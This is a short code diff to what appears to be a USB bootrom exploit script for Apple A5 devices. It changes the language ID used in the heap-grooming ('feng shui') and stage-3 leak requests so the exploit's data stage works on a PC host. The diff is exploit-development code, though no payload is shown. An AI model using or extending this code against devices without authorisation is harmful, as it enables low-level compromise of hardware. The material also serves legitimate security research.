@@ -69,7 +69,11 @@ REQ_DNLOAD = 1
 REQ_DFU_GETSTATUS = 3
 STRING_DESCRIPTOR = 3
 LANG_EN_US = 0x0409
-HABR_LANG = 0x040A  # wIndex used by the A5 leak requests (value is irrelevant)
+HABR_LANG = 0x040A  # wIndex used by the A5 leak requests in the Arduino source
+# The Habr/A5 notes say the leak request's wIndex value is irrelevant.  Use the
+# supported en-US LANGID on the PC host so the data stage actually returns data
+# instead of stalling on 0x040A.
+LEAK_LANG = LANG_EN_US
 
 # libusb transfer status values (libusb_transfer_status)
 STATUS_NAMES = {
@@ -433,7 +437,7 @@ def heap_feng_shui_req(usb, handle, serial_idx, sz, debug=False):
     zero-length-packet quirk.  What matters is that the SETUP is processed.
     """
     rc, _ = usb.ctrl_in(handle, 0x80, REQ_GET_DESCRIPTOR,
-                        (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
+                        (STRING_DESCRIPTOR << 8) | serial_idx, LEAK_LANG,
                         sz, 10)
     if debug:
         print('    [debug] feng shui %#x rc=%d' % (sz, rc))
@@ -519,7 +523,7 @@ def stage3(usb, serial_idx, payload, overwrite, spin_us, out_spin_us, write_mode
     # here would be processed as a zero-length data packet and reset the global
     # USB state on A5.
     rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
-                            (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
+                            (STRING_DESCRIPTOR << 8) | serial_idx, LEAK_LANG,
                             0x81, b'', abandon=True, spin_us=spin_us,
                             timeout_ms=500, name='critical IN')
     if debug:
